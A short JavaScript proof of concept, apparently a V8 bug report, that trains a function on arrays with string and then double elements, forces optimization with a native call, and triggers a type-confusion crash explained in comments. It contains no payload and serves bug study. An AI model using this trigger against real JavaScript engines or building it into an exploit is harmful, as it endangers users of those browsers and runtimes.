function boom(a1, a2) {
    var s = a2[0];
    var t = a1[0];
    a2[0] = 0.3;
    print(s);
    print(t);		// <-- crash
    print(a2[0]);
    print('----');
}

/* Step 1 */
var fast_elem = new Array(1);
fast_elem[0] = "tagged";
boom(fast_elem, [1]);

/* Step 2 */
var double_elem = new Array(1);
double_elem[0] = 0.1;
boom(double_elem, double_elem);

/* Step 3 */
%OptimizeFunctionOnNextCall(boom);
boom(double_elem, double_elem);

/*
    Step 1.
	a1[0] <-- load fast element (string) 

    Step 2.
	a2[0] = 0.3 <-- store double element

    Step 3.
	a. Optimize 'boom' funciton
	b. call it again.
	c. print(t) --> crash!
	d. a1[0] maybe load fast element (string). : assumption failure
	   --> Object::IsString()
	   --> Map::instance_type()
	   --> return static_cast<InstanceType>(READ_BYTE_FIELD(this, kInstanceTypeOffset));
*/
